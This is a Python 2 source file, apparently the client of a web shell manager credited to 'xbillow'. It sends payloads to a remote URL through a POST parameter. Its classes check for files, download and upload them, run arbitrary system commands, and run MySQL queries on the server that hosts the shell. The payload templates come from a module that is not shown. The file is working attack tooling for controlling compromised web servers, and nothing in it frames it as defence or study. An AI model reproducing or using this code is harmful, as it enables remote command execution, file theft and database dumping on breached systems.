#!encoding:utf-8
import os
import urllib2
import base64
import time
from Payloads import Payloads
#author:xbillow
class FileManage:
    def __init__(self,url,para):
        self.url=url
        self.para=para
    def isExists(self,filepath):
        '''If http error,return None.'''
        payload=Payloads.fileExists.format(filepath)
        try:
            # print payload
            res=urllib2.urlopen(self.url,data=self.para+'='+payload,timeout=3)
            temp=res.read()
            if temp[temp.index('*-*-*-*-*-*-*-*-*-*')+19:temp.rindex('*-*-*-*-*-*-*-*-*-*')]=='true':
                return True
            else:
                return False
        except:
            pass
            
    def download(self,filepath):
        '''Download the specific file to the current directory.'''
        if self.isExists(filepath):
            payload=Payloads.fileDownload.format(filepath)
            try:
                # print payload
                res=urllib2.urlopen(self.url,data=self.para+'='+payload,timeout=3)
                localFileName=filepath.replace('/','\\').split('\\')[-1]
                f=open(localFileName,'wb')
                temp=res.read()
                f.write(base64.b64decode(temp[temp.index('*-*-*-*-*-*-*-*-*-*')+19:temp.rindex('*-*-*-*-*-*-*-*-*-*')]))
                f.close()
                print("[+]Download {} to ./{}".format(filepath,localFileName))
            except Exception as e:
                print e
                print("[-]Error:Download failed!")
        else:
            print("[-]Error:The file is not exists!")

    def upload(self,lpath,rpath):
        '''Upload file from lpath to rpath.'''
        if not os.path.exists(lpath):
            print("[-]Error:Local file is not exists!")
            return
        f=open(lpath,'rb')
        payload=Payloads.fileUpload.format(path=rpath,content=base64.b64encode(f.read()))
        f.close()
        try:
            res=urllib2.urlopen(self.url,data=self.para+'='+payload,timeout=3)
            # print payload

            if res.read()=='*-*-*-*-*-*-*-*-*-*OK*-*-*-*-*-*-*-*-*-*':
                print("[+]Upload to {}.".format(rpath))
            else:
                print("[-]Error:Upload failed!")
        except Exception as e:
            print("[-]Error:Upload failed!"+str(e))
class Syscmd:
    def __init__(self,url,para):
        self.url=url
        self.para=para
    def system(self,cmd):
        '''Execute a system command.'''
        payload=Payloads.syscmd.format(cmd)
        try:
            # print payload
            res=urllib2.urlopen(self.url,data=self.para+'='+payload)
            temp=res.read()
            print temp[temp.index('*-*-*-*-*-*-*-*-*-*')+19:temp.rindex('*-*-*-*-*-*-*-*-*-*')]
            print("[+]Execute successfully!\n")
        except Exception as e:
            print e
            print("[-]Error:Execute failed!\n")
class DbManage:
    def __init__(self,url,para):
        self.url=url
        self.para=para
    def connect(self,host='127.0.0.1',user='root',passwd='',port=3306):
        self.conn=Payloads.sqlExec.format(host=host,user=user,passwd=passwd,db="{db}",port=port,sql='{sql}')
        self.payload=Payloads.sqlExec.format(host=host,user=user,passwd=passwd,db="information_schema",port=port,sql='{sql}')
    def changeDb(self,db):
        self.payload=self.conn.format(db=db,sql='{sql}')
        print "Database changed."
    def printdata(self,table):
        length=[0 for i in range(len(table[0]))]
        for i in range(len(table[0])):
            for j in range(len(table)):
                # print j,i
                # print table[j][i]
                l=len(table[j][i])
                if l>length[i]:
                    length[i]=l
        print ""
        for i in range(len(table)):
            print "|",
            for j in range(len(table[0])):
                print table[i][j].center(length[j])+"|",
            print "|"
        print ""
        
    def execute(self,sql):
        payload=self.payload.format(sql=sql)
        try:
            # print payload
            res=urllib2.urlopen(self.url,data=self.para+'='+payload)
            temp=res.read()
            with open(time.strftime('.%Y%m%d %H%M%S.csv'),'w') as f:
                f.write(sql+'\n')
                f.write(temp[temp.index('*-*-*-*-*-*-*-*-*-*')+19:temp.rindex('*-*-*-*-*-*-*-*-*-*')])
            data=temp[temp.index('*-*-*-*-*-*-*-*-*-*')+19:temp.rindex('*-*-*-*-*-*-*-*-*-*')].split('\n')[:-1]
            data=[i.split(',')[:-1] for i in data]
            self.printdata(data)
            print("[+]Execute successfully!\n")
        except Exception as e:
            print e
            print("[-]Error:Execute failed!\n")




